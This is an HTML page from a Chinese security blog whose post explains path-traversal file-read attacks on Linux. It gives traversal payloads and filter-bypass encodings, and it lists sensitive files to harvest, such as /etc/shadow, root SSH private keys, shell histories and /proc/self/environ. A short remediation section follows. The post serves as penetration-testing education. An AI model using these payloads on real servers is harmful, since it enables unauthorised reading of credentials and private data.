@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="路径穿越,Linux,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="比如存在文件下载/读取漏洞，在不知道源码位置的情况下，利用Linux的文件系统进行信息收集，可以慢慢的寻找到网站部署位置或者整个源码。 首先挖掘漏洞实现目录穿越 1../../../../../../../../../../../../../../		../要足够多 如果../被替换为空，可以尝试双写 12..././...../// 如果../被拦截，还可以利用正则（要看中间件是否支持） 12c">
+<meta name="keywords" content="路径穿越,Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件读取漏洞之针对Linux文件系统的利用">
+<meta property="og:url" content="https://jeremyekek.github.io/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/index.html">
+<meta property="og:site_name" content="EkEk的个人博客">
+<meta property="og:description" content="比如存在文件下载/读取漏洞，在不知道源码位置的情况下，利用Linux的文件系统进行信息收集，可以慢慢的寻找到网站部署位置或者整个源码。 首先挖掘漏洞实现目录穿越 1../../../../../../../../../../../../../../		../要足够多 如果../被替换为空，可以尝试双写 12..././...../// 如果../被拦截，还可以利用正则（要看中间件是否支持） 12c">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/image-20191202205425987.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/image-20191202222156299.png">
+<meta property="og:updated_time" content="2020-09-05T13:55:21.635Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件读取漏洞之针对Linux文件系统的利用">
+<meta name="twitter:description" content="比如存在文件下载/读取漏洞，在不知道源码位置的情况下，利用Linux的文件系统进行信息收集，可以慢慢的寻找到网站部署位置或者整个源码。 首先挖掘漏洞实现目录穿越 1../../../../../../../../../../../../../../		../要足够多 如果../被替换为空，可以尝试双写 12..././...../// 如果../被拦截，还可以利用正则（要看中间件是否支持） 12c">
+<meta name="twitter:image" content="https://jeremyekek.github.io/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/image-20191202205425987.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":20,"b2t":true,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jeremyekek.github.io/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/">
+
+
+
+
+
+  <title>文件读取漏洞之针对Linux文件系统的利用 | EkEk的个人博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">EkEk的个人博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jeremyekek.github.io/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="EkEk">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="EkEk的个人博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件读取漏洞之针对Linux文件系统的利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-09-05T21:55:21+08:00">
+                2020-09-05
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/12/04/文件读取漏洞之针对Linux文件系统的利用/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>比如存在文件下载/读取漏洞，在不知道源码位置的情况下，利用Linux的文件系统进行信息收集，可以慢慢的寻找到网站部署位置或者整个源码。</p>
+<h2 id="首先挖掘漏洞"><a href="#首先挖掘漏洞" class="headerlink" title="首先挖掘漏洞"></a>首先挖掘漏洞</h2><p>实现目录穿越</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../../../../../../../../		../要足够多</span><br></pre></td></tr></table></figure>
+<p>如果../被替换为空，可以尝试双写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..././</span><br><span class="line">.....///</span><br></pre></td></tr></table></figure>
+<p>如果../被拦截，还可以利用正则（要看中间件是否支持）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat .?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/etc/passwd</span><br><span class="line">cat /.$@./etc/passwd					//在任何目录都可以读取</span><br></pre></td></tr></table></figure>
+<p>有的开发者过滤检测的是../../ ../../../，emmmmmmm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..//..//..//..//..//..//..//..//..//..//..//..//..//..//   //针对../../过滤</span><br><span class="line">../..//../..//../..//../..//../..//../..//../..//../..//   //针对../../../过滤</span><br></pre></td></tr></table></figure>
+<p>还可以尝试编码</p>
+<blockquote>
+<p>前提是服务器端能够识别此编码并解析</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..%5c/..%5c/..%5c/..%5c/						//url编码</span><br><span class="line">..%255c/..%255c/..%255c/..%255c/			//url二次编码</span><br><span class="line">unicode/UTF-8编码/其他编码</span><br></pre></td></tr></table></figure>
+<p>也可以尝试下这个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ..\/..\/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>如果是windows环境,还可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\..\</span><br></pre></td></tr></table></figure>
+<p>Tomcat支持如下路径</p>
+<blockquote>
+<p>文件读取路径可能不太行</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../..;/</span><br><span class="line">../..;a=b/</span><br></pre></td></tr></table></figure>
+<h2 id="开始信息收集"><a href="#开始信息收集" class="headerlink" title="开始信息收集"></a>开始信息收集</h2><p>查看系统用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd				//如果passwd黑名单，可以尝试其他不敏感的文件</span><br></pre></td></tr></table></figure>
+<p>判断当前web服务的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow				//root权限才可以读取</span><br></pre></td></tr></table></figure>
+<p>系统版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/version</span><br><span class="line">/etc/redhat-release			//RHEL系</span><br><span class="line">/etc/issue					//登陆提示</span><br><span class="line">/etc/issue.net				//远程登陆提示</span><br><span class="line">/etc/motd					//登陆后提示</span><br></pre></td></tr></table></figure>
+<p>网络配置信息</p>
+<p>Red Hat Linux 系列网络配置文件路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/sysconfig/network-scripts/ifcfg-ethX      # IP地址，子网掩码等配置文件</span><br><span class="line">/etc/sysconfig/network-scripts/ifcfg-lo        # 回环网卡配置</span><br><span class="line">/etc/sysconfig/network                         # 主机名和网关配置文件</span><br><span class="line">/etc/resolv.conf                               # DNS配置文件</span><br><span class="line">/etc/hosts                                     # 主机和IP绑定信息</span><br></pre></td></tr></table></figure>
+<p>Debian / Ubuntu Linux 网络配置文件路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/network/interfaces                        # IP地址，子网掩码等配置文件</span><br><span class="line">/etc/resolv.conf                               # DNS</span><br><span class="line">/etc/hostname                                  # 全局主机名配置</span><br><span class="line">/etc/hosts                                     # 主机和IP绑定信息</span><br></pre></td></tr></table></figure>
+<p>suse Linux 网络配置文件路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/sysconfig/network/ifcfg-eth-id-HWaddr     # IP地址，子网掩码等配置文件</span><br><span class="line">/etc/HOSTNAME                                  # 全局主机名配置</span><br><span class="line">/etc/resolv.conf                               # DNS配置文件</span><br><span class="line">/etc/sysconfig/network/routes                  # 网关配置文件</span><br><span class="line">/etc/hosts                                     # 主机和IP绑定信息</span><br></pre></td></tr></table></figure>
+<p>Slackware Linux 网络配置文件路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.d/rc.inet1.conf                        # IP地址，子网掩码等配置文件</span><br><span class="line">/etc/resolv.conf                               # DNS</span><br><span class="line">/etc/hostname                                  # 全局主机名配置</span><br><span class="line">/etc/networks                                  # 设置网络号等相关信息</span><br><span class="line">/etc/hosts                                     # 设置主机和IP地址绑定</span><br></pre></td></tr></table></figure>
+<p>日志文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/var/<span class="built_in">log</span>/boot.log	//系统在引导过程中发生的事件</span><br><span class="line">/var/<span class="built_in">log</span>/lastlog	//最后一次用户成功登陆的时间、登陆IP</span><br><span class="line">/var/<span class="built_in">log</span>/messages 	//记录Linux操作系统常见的系统和服务错误信息</span><br><span class="line">/var/<span class="built_in">log</span>/syslog		//记录警告信息，系统问题信息，可使用lastlog查看</span><br><span class="line">/var/<span class="built_in">log</span>/secure 	//记录用户和工作组变化、用户登陆认证信息</span><br><span class="line">/var/<span class="built_in">log</span>/btmp		//记录Linux登陆失败的用户、时间以及远程IP地址</span><br><span class="line">/var/<span class="built_in">log</span>/wtmp		//记录每个用户登录、注销及系统的启动、停机的事件，可使用last命令查看</span><br><span class="line">/var/run/utmp//该日志文件记录有关当前登录的每个用户的信息。可使用who/w/users/finger查看</span><br><span class="line">/var/<span class="built_in">log</span>/httpd/access_log	//apache访问日志</span><br><span class="line">/var/<span class="built_in">log</span>/httpd/error_log	//错误日志</span><br><span class="line"><span class="comment">#root或者其他用户家目录下的文件</span></span><br><span class="line">~/.viminfo					//vim打开文件历史</span><br><span class="line">~/.bash_history 			//历史命令</span><br><span class="line">~/.wget-hsts 				//wget历史</span><br><span class="line">~/.mysql_history			//mysql命令历史</span><br></pre></td></tr></table></figure>
+<p>计划任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#crontab</span></span><br><span class="line">/etc/crontab				//crontab配置文件</span><br><span class="line">/etc/anacrontab				//anacrontab配置文件</span><br><span class="line">/etc/cron.*/目录			   //cron.d/.daily/.hourly/.monthly/.weekly</span><br><span class="line">/etc/cron.allow				//指定那些用户可以使用crontab</span><br><span class="line">/etc/cron.deny				//指定哪些用户禁止使用crontab</span><br><span class="line">/var/spool/cron/USERNAME	//各用户计划任务配置文件</span><br><span class="line"><span class="comment">#at		</span></span><br><span class="line">/var/spool/at/				//at计划任务的目录</span><br><span class="line">/etc/at.deny				//不能使用at命令的用户</span><br><span class="line">/etc/at.allow				//允许使用at命令的用户</span><br></pre></td></tr></table></figure>
+<p>应用配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/etc/fstab					//文件系统格式表</span><br><span class="line">/etc/my.cnf 				//mysql的配置文件</span><br><span class="line">/etc/rsyncd.conf			//同步程序配置文件</span><br><span class="line"><span class="comment">#ssh</span></span><br><span class="line">/etc/ssh/sshd_config		//ssh配置文件</span><br><span class="line">/root/.ssh/id_rsa			//私钥，万一中奖了呢</span><br><span class="line">/root/.ssh/authorized_keys	//公钥</span><br><span class="line"></span><br><span class="line"><span class="comment">#网络配置&amp;&amp;访问控制</span></span><br><span class="line">/etc/protocols				//可以对比是否有新增的协议</span><br><span class="line">/etc/services				//可以对比是否有新增的端口</span><br><span class="line">/etc/sysconfig/iptables		//iptables规则</span><br><span class="line">/etc/hosts.allow			//网络连接的白名单</span><br><span class="line">/etc/hosts.deny				//黑名单//使用的很少，更多是iptables</span><br><span class="line"></span><br><span class="line"><span class="comment">#shell&amp;&amp;bash</span></span><br><span class="line">/etc/shells					//支持的shell</span><br><span class="line">/etc/sudoers				//sudo配置文件</span><br><span class="line">/etc/rc.d/rc.local			//系统启动时执行的文件</span><br><span class="line">/etc/bashrc 				//使用bash时，可设置全局环境配置</span><br><span class="line">~/.bashrc					//针对某个用户的配置，会调用/etc/bashrc</span><br><span class="line">~/.bash_profile  			//针对某个用户的配置，会调用.bash_rc</span><br><span class="line">~/.bash_logout				//用户退出时执行</span><br><span class="line">/etc/profile				//全局交互式shell环境配置</span><br><span class="line">/root/.profile				//用户交互式shell环境配置</span><br><span class="line"></span><br><span class="line"><span class="comment">#FTP</span></span><br><span class="line">/etc/group					//用户组配置文件</span><br><span class="line">/etc/ftpconvions 			//FTP服务器配置文件</span><br><span class="line">/etc/ftpgroups				//FTP服务器配置文件</span><br><span class="line">/etc/ftpaccess				//FTP访问控制文件</span><br><span class="line">/etc/ftpusers				//不允许ftp的用户列表</span><br><span class="line">/etc/proftpd.conf			</span><br><span class="line">/etc/samba/smb.conf			//SAMBA 服务器配置文件</span><br><span class="line">/etc/smb.conf</span><br></pre></td></tr></table></figure>
+<p>web服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Apache</span></span><br><span class="line">/etc/apache2/apache2.conf		//apache2配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf		//apache配置文件</span><br><span class="line">/etc/httpd/conf.d/*.conf		//其他配置文件</span><br><span class="line">/etc/httpd/run/httpd.pid		//http服务进程号</span><br><span class="line">/etc/php/7.x/cli/php.ini		//PHP配置文件</span><br><span class="line">/etc/php/7.x/apache2/php.ini</span><br><span class="line"><span class="comment">#Tomcat</span></span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/server.xml		//主配置文件</span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/context.xml		//默认context容器</span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/web.xml			//应用程序的部署描述符文件</span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/tomcat-users.xml	//角色(授权用户)配置文件</span><br><span class="line"><span class="variable">$&#123;CATALINA_HOME&#125;</span>/conf/Catalina/<span class="variable">$&#123;hostName&#125;</span>/xxx.xml</span><br><span class="line">这里还可以再补补</span><br></pre></td></tr></table></figure>
+<p>使用 /proc <strong>虚拟文件系统</strong>来访问 Linux 内核</p>
+<p>proc文件系统是一个虚拟文件系统，它存储了当前内核运行状态相关文件，并且文件的内容都是动态创建的。用户可以通过查看这些文件获取系统状态以及当前正在运行的进程信息。</p>
+<p><img src="/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/image-20191202205425987.png" alt="image-20191202205425987"></p>
+<p>可以看到有三类内容：</p>
+<ul>
+<li>普通文件，如version，它存放的是内核版本相关信息</li>
+<li>以数值命名的文件夹，如1，它存放的是init进程相关信息</li>
+<li>非数字命名的文件夹，如drivers，它存放的是驱动相关信息</li>
+</ul>
+<p>左边是一系列数字编号的文件，每个实际上都是一个目录，表示系统中的一个进程。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ls -a /proc</span><br><span class="line">774  acpi         iomem        mtrr           uptime</span><br><span class="line">775  asound       ioports      net            version</span><br><span class="line">781  buddyinfo    irq          pagetypeinfo   version_signature</span><br><span class="line">782  bus          kallsyms     partitions     vmallocinfo</span><br><span class="line">8    cgroups      kcore        sched_debug    vmstat</span><br><span class="line">813  cmdline      keys         schedstat      zoneinfo</span><br><span class="line">9    consoles     key-users    scsi</span><br><span class="line">973  cpuinfo      kmsg         self</span><br><span class="line">974  crypto       kpagecgroup  slabinfo</span><br><span class="line">978  devices      kpagecount   softirqs</span><br><span class="line">98   diskstats    kpageflags   <span class="built_in">stat</span></span><br><span class="line">983  dma          loadavg      swaps</span><br><span class="line">984  driver       locks        sys</span><br><span class="line">987  execdomains  mdstat       sysrq-trigger</span><br><span class="line">99   fb           meminfo      sysvipc</span><br><span class="line">994  filesystems  misc         thread-self</span><br><span class="line">996  fs           modules      timer_list</span><br><span class="line">998  interrupts   mounts       tty</span><br><span class="line">（列出部分内容）</span><br></pre></td></tr></table></figure>
+<p>内核相关信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/proc/mounts				//系统当前挂载的所有文件系统</span><br><span class="line">/proc/net/arp				//arp表</span><br><span class="line">/proc/net/route				//路由表</span><br></pre></td></tr></table></figure>
+<p>/proc/pid下文件夹和文件内容</p>
+<p><img src="/2019/12/04/文件读取漏洞之针对Linux文件系统的利用/image-20191202222156299.png" alt="image-20191202222156299"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmdline 	//用于开始进程的命令</span><br><span class="line">cwd 		//当前进程工作目录的一个符号链接</span><br><span class="line">environ 	//可用进程环境变量的列表</span><br><span class="line">exe 		//正在进程中运行的程序链接</span><br><span class="line">fd/ 		//这个目录包含了进程打开的文件描述符</span><br><span class="line">mem 		//进程在内存中的内容</span><br><span class="line">status 		//进程的状态信息</span><br><span class="line">statm 		//进程的内存使用信息</span><br><span class="line">limits 		//进程的软限制，硬限制等信息</span><br><span class="line">maps 		//进程的内存区域映射信息</span><br><span class="line">stack 		//当前进程的内核调用栈信息</span><br><span class="line">syscall 	//进程正在执行的系统调用</span><br><span class="line">task 		//进程下的线程信息</span><br><span class="line"></span><br><span class="line">/proc/self/cmdline 			//获取当前进程执行的命令行参数</span><br><span class="line">/proc/&#123;PID&#125;/cmdline			//遍历PID号</span><br><span class="line"><span class="comment">#环境变量</span></span><br><span class="line">/proc/self/environ			//当前环境变量</span><br><span class="line">/proc/&#123;PID&#125;/environ</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>黑名单的形式总是容易被绕过。</p>
+<ol>
+<li>根据实际功能，可以考虑使用白名单方式修复，例如限定所能读取的文件类型为图片类型。</li>
+<li>如果传输参数进行了编码操作，后端接收参数先解码，后校验内容；  </li>
+<li>针对参数中的路径穿越关键字“..”进行检测，拦截并响应非法提交，记录ip检测攻击行为；  </li>
+<li>部署项目后及时删除打包的源码或者WAR包，降低安全风险；  </li>
+<li>建议开发者遵循安全编码规范，对传输的可控参数进行严格检验。  </li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/50338503" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/50338503</a></p>
+<p><a href="https://blog.csdn.net/skypeGNU/article/details/14519775" target="_blank" rel="noopener">https://blog.csdn.net/skypeGNU/article/details/14519775</a></p>
+<p><a href="https://blog.csdn.net/wuseyukui/article/details/24498751" target="_blank" rel="noopener">https://blog.csdn.net/wuseyukui/article/details/24498751</a></p>
+<p>如果有欠缺的地方，欢迎各位大佬补充。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/路径穿越/" rel="tag"># 路径穿越</a>
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/07/CVE-2019-0708-远程桌面代码执行漏洞复现/" rel="next" title="CVE-2019-0708-远程桌面RCE漏洞">
+                <i class="fa fa-chevron-left"></i> CVE-2019-0708-远程桌面RCE漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/12/ByPass阿里云盾-SQL注入篇/" rel="prev" title="ByPass阿里云盾-SQL注入篇">
+                ByPass阿里云盾-SQL注入篇 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
